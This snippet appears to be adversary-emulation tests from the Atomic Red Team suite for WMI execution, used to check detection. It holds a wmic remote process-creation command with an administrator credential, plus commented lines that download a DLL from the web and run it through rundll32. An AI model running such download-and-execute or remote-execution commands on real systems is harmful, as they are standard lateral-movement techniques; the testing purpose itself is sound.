#Atomic Test #6 - WMI Execute Remote Process
Start-Process cmd.exe '/c "wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process call create notepad.exe""'


#Atomic Test #9 - WMI Execute rundll32
# [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true" -OutFile "$env:TEMP\calc.dll"
# wmic /node:127.0.0.1 process call create "rundll32.exe $env:TEMP\calc.dll StartW"

# Cleanup Commands:
# taskkill /f /im calculator.exe#